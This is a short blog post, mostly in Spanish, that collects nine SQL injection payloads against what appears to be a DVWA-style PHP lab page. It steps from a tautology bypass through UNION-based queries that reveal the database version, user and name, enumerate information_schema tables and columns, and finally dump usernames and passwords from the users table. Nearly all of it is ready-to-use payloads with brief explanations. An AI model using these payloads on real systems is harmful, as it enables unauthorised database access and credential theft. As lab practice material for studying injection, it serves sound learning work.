---
title: My Top SQL Injections
layout: post
post-image: /assets/images/bannergit.png
description: (mostly parched) (basic-low-medium level)
tags:
- SQl Injection
- Ethical Hacker
- Cybersecurity
---




```
                             My Top SQL Injections (mostly parched) (basic-low-medium level) 
```

## \[1\] Check-in

Input:

```bash
1
```

> > La página web/código debe imprimir ID, nombre y apellido en la pantalla.

> > > Declaración de selección de PHP, específicamente $id, se ve asi:

$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";

## \[2\] Basic-one

Input:

```bash
%' or '0'='0
```

> En este escenario, decimos mostrar todos los registros que son falsos y todos los registros que son verdaderos.
> %' \- Probablemente no será igual a nada y será falso.
> '0'='0' - Es igual a verdadero, porque 0 siempre será igual a 0.

> > > Declaración de base de datos, se ve asi:
> > > 
> > > > mysql> SELECT first\_name, last\_name FROM users WHERE user_id = '%' o '0'='0';

## \[3\] Database-Version

Input:

```bash
%' or 0=0 union select null, version() #
```

> > > Esta es la versión de la base de datos mysql.

## \[4\] Database-User

Input:

```bash
%' or 0=0 union select null, user() #
```

> > Este es el nombre del usuario de la base de datos que ejecutó el código PHP detrás de escena.

## \[5\] Database-Name

Input:

```bash
%' or 0=0 union select null, database() #
```

> This is the name of the database, nombre de la base de datos.

## \[6\] Display--all-tables--in--information_schema

Input:

```bash
%' and 1=0 union select null, table_name from information_schema.tables #
```

> > Mostrando todas las tablas en la base de datos information_schema.
> > El INFORMACION_ESQUEMA es la base de datos de información, el lugar que almacena información sobre todas las demás bases de datos que mantiene el servidor MySQL.

## \[7\] Display-all-the user tables in information_schema

Input:

```bash
%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
```

> > Estamos mostrando todas las tablas que comienzan con el prefijo "usuario" en la base de datos information_schema.

## \[8\] Display all the columns fields in the information_schema user table

Input:

```bash
%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
```

> > Ahora estamos mostrando todas las columnas en la tabla de usuarios.
> > 
> > > Observe que hay una columna de ID de usuario, nombre, apellido, usuario y contraseña.

## \[9\] Display all the columns field contents in the information_schema user table

Input:

```bash
%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
```

> > Ahora hemos mostrado con éxito toda la información de autenticación necesaria en esta base de datos.


{% highlight html %}

ɹǝqʎɔɯʇ

{% endhighlight %}

{% include share-buttons.html %}